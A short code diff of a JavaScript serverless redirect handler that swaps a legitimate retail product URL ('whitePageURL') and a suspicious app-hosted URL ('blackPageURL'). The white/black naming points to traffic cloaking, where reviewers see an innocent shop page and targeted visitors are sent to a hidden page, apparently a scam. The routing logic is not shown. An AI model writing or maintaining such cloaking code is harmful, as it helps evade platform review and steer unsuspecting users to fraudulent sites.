@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.stateofescape.com/collections/best-sellers/products/escape-tote-in-stone?variant=29376270237805";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
+    const whitePageURL = "https://edenrobe.com/collections/women-unstitched/products/unstitched-light-beige-printed-lawn-2-piece-ewu5a1-35601st";
+    const blackPageURL = "https://msgurupml.lovable.app/";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
